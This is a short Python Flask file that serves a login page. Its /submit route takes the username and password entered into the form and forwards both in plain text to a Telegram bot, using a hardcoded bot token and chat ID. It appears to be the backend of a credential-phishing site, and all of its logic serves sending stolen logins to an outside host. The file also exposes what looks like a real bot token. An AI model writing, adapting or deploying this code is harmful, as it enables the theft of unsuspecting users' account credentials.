from flask import Flask, render_template, request
import requests

app = Flask(__name__)
bot_token = '6462627968:AAESgWsZgPNjDl9wZpMa8LX1V0qGzRLDx60'
chat_id = '-4175845917'

@app.route('/')
def index():
    return render_template('home.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']

    # Send the username and password to the Telegram bot
    message = f"Username: {username}\nPassword: {password}"
    telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
    response = requests.get(telegram_url)

    if response.status_code == 200:
        return "Data submitted successfully and sent to the Telegram bot!"
    else:
        return "Failed to send data to the Telegram bot."

if __name__ == '__main__':
    app.run()
